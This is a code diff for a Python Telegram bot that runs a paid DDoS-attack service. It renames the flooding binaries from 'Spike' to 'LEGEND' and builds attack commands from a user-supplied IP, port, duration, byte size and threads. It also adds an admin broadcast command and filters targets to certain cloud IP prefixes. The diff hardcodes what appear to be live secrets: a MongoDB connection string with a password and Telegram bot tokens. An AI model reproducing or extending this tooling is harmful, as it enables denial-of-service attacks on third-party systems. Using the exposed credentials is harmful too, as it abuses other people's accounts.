@@ -16,12 +16,12 @@ MONGO_URI = 'mongodb+srv://nedop17612:ZnXnERM6swVt16gc@cluster0.hhq4k.mongodb.ne
 client = MongoClient(MONGO_URI)
 db = client['TEST']
 users_collection = db['users']
-settings_collection = db['settings']  # A new collection to store global settings
+settings_collection = db['settings-V9']  # A new collection to store global settings
 redeem_codes_collection = db['redeem_codes']
 attack_logs_collection = db['user_attack_logs']
 
 # Bot Configuration
-TELEGRAM_BOT_TOKEN = '8012442954:AAHhBWv1JQi0XarOU0pYuraskEBsGlnVZ64'
+TELEGRAM_BOT_TOKEN = '8012442954:AAEeWJ4wyOgCcZr6FoDsq9VrNgkFq8t2VYI'
 ADMIN_USER_ID = 1929943036 
 ADMIN_USER_ID = 1929943036 
 COOLDOWN_PERIOD = timedelta(minutes=1) 
@@ -39,7 +39,7 @@ valid_ip_prefixes = ('52.', '20.', '14.', '4.', '13.')
 
 # Adjust this to your local timezone, e.g., 'America/New_York' or 'Asia/Kolkata'
 LOCAL_TIMEZONE = pytz.timezone("Asia/Kolkata")
-PROTECTED_FILES = ["Spike.py", "Spike"]
+PROTECTED_FILES = ["LEGEND.py", "LEGEND"]
 BLOCKED_COMMANDS = ['nano', 'vim', 'shutdown', 'reboot', 'rm', 'mv', 'dd']
 
 # Fetch the current user and hostname dynamically
@@ -325,6 +325,7 @@ async def help_command(update: Update, context: CallbackContext):
             "*🔸 /byte [size]* - Set the byte size.\n"
             "*🔸 /show* - Show current settings.\n"
             "*🔸 /users* - List all allowed users.\n"
+            "*🔸 /broadcast [message]* - Broadcast a message to all users.\n"
             "*🔸 /gen* - Generate a redeem code.\n"
             "*🔸 /redeem* - Redeem a code.\n"
             "*🔸 /cleanup* - Clean up stored data.\n"
@@ -535,6 +536,53 @@ async def is_user_allowed(user_id):
                 return True
     return False
 
+#function to broadcast 
+
+async def broadcast(update: Update, context: CallbackContext):
+    user_id = update.effective_user.id
+    if user_id != ADMIN_USER_ID:
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="*❌ You are not authorized to broadcast messages!*",
+            parse_mode='Markdown'
+        )
+        return
+    if not context.args:
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="*⚠️ Usage: /broadcast <message>*",
+            parse_mode='Markdown'
+        )
+        return
+    message = ' '.join(context.args)
+    users = users_collection.find()
+    sent_count = 0
+    failed_count = 0
+    try:
+        for user in users:
+            try:
+                await context.bot.send_message(
+                    chat_id=user['user_id'],
+                    text=f"📢 *Broadcast Message:*\n{message}",
+                    parse_mode='Markdown'
+                )
+                sent_count += 1
+                await asyncio.sleep(0.05)  # Rate limiting to avoid Telegram API flood control
+            except Exception as e:
+                failed_count += 1
+                print(f"Failed to send message to user {user['user_id']}: {str(e)}")
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text=f"*✅ Broadcast Summary:*\n*Sent to {sent_count} users*\n*Failed for {failed_count} users*",
+            parse_mode='Markdown'
+        )
+    except Exception as e:
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text=f"*❌ Error during broadcast: {str(e)}*",
+            parse_mode='Markdown'
+        )
+
 # Function to set the argument type for attack commands
 async def set_argument(update: Update, context: CallbackContext):
     user_id = update.effective_user.id
@@ -672,11 +720,11 @@ async def attack(update: Update, context: CallbackContext):
 
     # Determine the attack command based on the argument type
     if argument_type == 3:
-        attack_command = f"./Spike3 {ip} {port} {duration}"
+        attack_command = f"./LEGEND3 {ip} {port} {duration}"
     elif argument_type == 4:
-        attack_command = f"./Spike4 {ip} {port} {duration} {threads}"
+        attack_command = f"./LEGEND4 {ip} {port} {duration} {threads}"
     elif argument_type == 5:
-        attack_command = f"./Spike {ip} {port} {duration} {byte_size} {threads}"
+        attack_command = f"./LEGEND {ip} {port} {duration} {byte_size} {threads}"
 
     # Send attack details to the user
     await context.bot.send_message(chat_id=chat_id, text=( 
@@ -1059,6 +1107,7 @@ def main():
     application.add_handler(CommandHandler("show", show_settings))
     application.add_handler(CommandHandler("users", list_users))
     application.add_handler(CommandHandler("attack", attack))
+    application.add_handler(CommandHandler("broadcast", broadcast))
     application.add_handler(CommandHandler("gen", generate_redeem_code))
     application.add_handler(CommandHandler("redeem", redeem_code))
     application.add_handler(CommandHandler("help", help_command))
